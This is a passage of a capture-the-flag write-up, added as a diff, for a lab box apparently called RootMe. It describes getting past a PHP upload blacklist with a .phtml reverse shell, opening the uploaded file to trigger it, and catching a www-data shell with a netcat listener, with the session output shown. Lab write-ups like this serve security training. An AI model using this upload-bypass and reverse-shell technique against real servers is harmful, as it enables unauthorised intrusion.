@@ -84,3 +84,39 @@ Progress: 5864 / 220561 (2.66%)                                                 
 
 ```
 
+
+Find a form to upload and get a reverse shell, and find the flag.
+
+
+![[Pasted image 20220818090736.png]]
+
+- created reverse_shell.phtml, since php is blacklisted and we also cannot bypass client side filter:
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
+└─$ ls
+gobuster_scan.txt  nmap_results.txt  README.md  reverse_shell.jpg  reverse_shell.php  reverse_shell.phtml
+                                                                                                                       
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/RootMe]
+└─$ 
+
+```
+
+After uploading the payload, go to http://ip:80/uploads/reverse_shell.phtml to obtain a shell on nc listener:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234                                  
+listening on [any] 1234 ...
+connect to [10.4.73.167] from (UNKNOWN) [10.10.43.146] 35740
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 13:07:17 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+```
+
+
